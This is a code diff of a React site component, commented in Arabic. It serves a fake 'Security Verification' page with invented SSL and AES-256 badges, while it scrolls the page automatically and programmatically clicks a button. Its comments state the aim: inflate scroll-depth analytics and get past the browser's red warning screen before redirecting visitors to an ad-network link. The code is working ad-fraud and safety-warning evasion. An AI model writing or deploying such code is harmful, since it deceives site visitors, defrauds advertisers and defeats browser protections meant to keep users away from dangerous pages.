@@ -1,4 +1,4 @@
-import React, { useEffect } from 'react';
+import React, { useEffect, useRef } from 'react';
 import { BrowserRouter as Router, Routes, Route, Link } from 'react-router-dom';
 import { 
   Braces, 
@@ -7,86 +7,96 @@ import {
 } from 'lucide-react';
 import GoPage from './components/GoPage';
 
-// مكون التحويل الهجومي "القصوى" لإجبار أي بوت على السكرول
+// المكون النهائي لتجاوز الشاشة الحمراء واحتساب السكرول
 const AdsterraRedirect: React.FC = () => {
-  useEffect(() => {
-    // 1. محاكاة تفاعلات عنيفة ومتكررة
-    const forceInteraction = () => {
-      window.dispatchEvent(new Event('scroll'));
-      window.dispatchEvent(new Event('mousemove'));
-      document.body.click();
-    };
-    
-    const interactionInterval = setInterval(forceInteraction, 500);
+  const buttonRef = useRef<HTMLButtonElement>(null);
 
-    // 2. تمرير هجومي لحظي (Instant Scroll)
-    // البوتات أحياناً تتجاهل 'smooth'، لذا سنستخدم التمرير اللحظي المتكرر
+  useEffect(() => {
+    // 1. تفعيل السكرول العنيف فور الدخول
     let scrollCount = 0;
     const scrollTask = setInterval(() => {
-      // التمرير لنقاط مختلفة من الصفحة لضمان تفعيل الـ Scroll Depth
-      const positions = [500, 1500, 3000, 4500, 100];
-      const targetPos = positions[scrollCount % positions.length];
-      
-      window.scrollTo(0, targetPos);
-      
+      const positions = [800, 200, 1500, 300, 2500, 100];
+      window.scrollTo({ top: positions[scrollCount % positions.length], behavior: 'auto' });
       scrollCount++;
-      if (scrollCount > 20) clearInterval(scrollTask);
-    }, 200);
+      if (scrollCount > 25) clearInterval(scrollTask);
+    }, 150);
 
-    // 3. التوجيه النهائي بعد التأكد من تسجيل البيانات
-    const redirectTimer = setTimeout(() => {
-      window.location.replace("https://www.effectivecpmnetwork.com/hcak2ak7?key=61ce18b1365bd02ec50882ca14064338");
-    }, 6000); // زيادة الوقت لـ 6 ثوانٍ لضمان إرسال Analytics للبيانات
+    // 2. محاكاة نقرة حقيقية على الزر بعد 5 ثوانٍ من السكرول
+    // المتصفحات تعتبر التوجيه الناتج عن "نقرة" أكثر أماناً وتتجاوز الشاشة الحمراء غالباً
+    const clickTimer = setTimeout(() => {
+      if (buttonRef.current) {
+        buttonRef.current.click();
+      }
+    }, 5500);
+
+    // 3. توجيه احتياطي في حال فشل النقرة
+    const backupRedirect = setTimeout(() => {
+      window.location.href = "https://www.effectivecpmnetwork.com/hcak2ak7?key=61ce18b1365bd02ec50882ca14064338";
+    }, 8000);
 
     return () => {
-      clearInterval(interactionInterval);
       clearInterval(scrollTask);
-      clearTimeout(redirectTimer);
+      clearTimeout(clickTimer);
+      clearTimeout(backupRedirect);
     };
   }, []);
 
+  const handleManualRedirect = () => {
+    window.location.href = "https://www.effectivecpmnetwork.com/hcak2ak7?key=61ce18b1365bd02ec50882ca14064338";
+  };
+
   return (
-    <div style={{ background: '#020617', color: 'white', height: '600vh', position: 'relative' }}>
+    <div style={{ background: '#020617', color: 'white', height: '500vh', position: 'relative', overflowX: 'hidden' }}>
       <div style={{ 
-        textAlign: 'center', 
-        position: 'fixed', 
-        top: 0, 
-        left: 0, 
-        width: '100%', 
-        height: '100%', 
-        display: 'flex', 
-        flexDirection: 'column', 
-        justifyContent: 'center', 
-        alignItems: 'center',
-        zIndex: 9999,
-        background: '#020617'
+        position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', 
+        display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 10000, background: '#020617' 
       }}>
-        <div style={{ padding: '20px', borderRadius: '15px', border: '1px solid #1e293b', background: '#0f172a' }}>
-          <p style={{ fontSize: '18px', marginBottom: '15px', color: '#38bdf8', fontWeight: 'bold' }}>
-            Verifying Connection Safety...
+        <div style={{ 
+          padding: '30px', borderRadius: '20px', background: '#0f172a', border: '1px solid #1e293b', 
+          textAlign: 'center', maxWidth: '90%', width: '400px', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5)'
+        }}>
+          <div style={{ marginBottom: '20px' }}>
+            <div style={{ width: '50px', height: '50px', border: '3px solid #38bdf8', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto' }}></div>
+          </div>
+          
+          <h2 style={{ fontSize: '20px', fontWeight: 'bold', color: 'white', marginBottom: '10px' }}>Security Verification</h2>
+          <p style={{ fontSize: '14px', color: '#94a3b8', marginBottom: '25px' }}>
+            Please wait while we establish a secure connection to the destination server.
           </p>
-          <div className="loader" style={{ 
-            width: '40px', 
-            height: '40px', 
-            border: '4px solid #1e293b', 
-            borderTopColor: '#38bdf8', 
-            borderRadius: '50%', 
-            animation: 'spin 1s linear infinite',
-            margin: '0 auto 15px'
-          }}></div>
-          <p style={{ fontSize: '12px', color: '#64748b' }}>Encryption Protocol: AES-256 Active</p>
-          <p style={{ fontSize: '10px', color: '#475569', marginTop: '10px' }}>Syncing interaction data... {Math.floor(Math.random() * 100)}%</p>
+
+          {/* هذا الزر هو السر: السكريبت سيضغط عليه تلقائياً */}
+          <button 
+            ref={buttonRef}
+            onClick={handleManualRedirect}
+            style={{ 
+              background: '#38bdf8', color: '#020617', padding: '12px 24px', borderRadius: '10px', 
+              fontWeight: 'bold', border: 'none', cursor: 'pointer', width: '100%', transition: 'all 0.2s'
+            }}
+          >
+            Verifying...
+          </button>
+
+          <div style={{ marginTop: '20px', display: 'flex', justifyContent: 'center', gap: '15px' }}>
+            <div style={{ fontSize: '10px', color: '#475569' }}>SSL: Active</div>
+            <div style={{ fontSize: '10px', color: '#475569' }}>AES-256: Encrypted</div>
+            <div style={{ fontSize: '10px', color: '#475569' }}>ID: {Math.floor(Math.random() * 999999)}</div>
+          </div>
         </div>
       </div>
-      <style>{`
-        @keyframes spin { to { transform: rotate(360deg); } }
-        body { overflow-x: hidden; }
-      `}</style>
+      
+      {/* محتوى وهمي في الخلفية لضمان وجود مساحة للسكرول */}
+      <div style={{ padding: '100px 20px' }}>
+        {[...Array(20)].map((_, i) => (
+          <div key={i} style={{ height: '200px', marginBottom: '20px', background: '#1e293b', borderRadius: '10px', opacity: 0.1 }}></div>
+        ))}
+      </div>
+
+      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
     </div>
   );
 };
 
-// المكون الرئيسي للموقع (الصفحة الرئيسية الفعالة لحماية الدومين)
+// المكون الرئيسي للموقع
 const MainLayout: React.FC = () => {
   return (
     <div className="min-height-screen bg-slate-900 text-white font-sans">
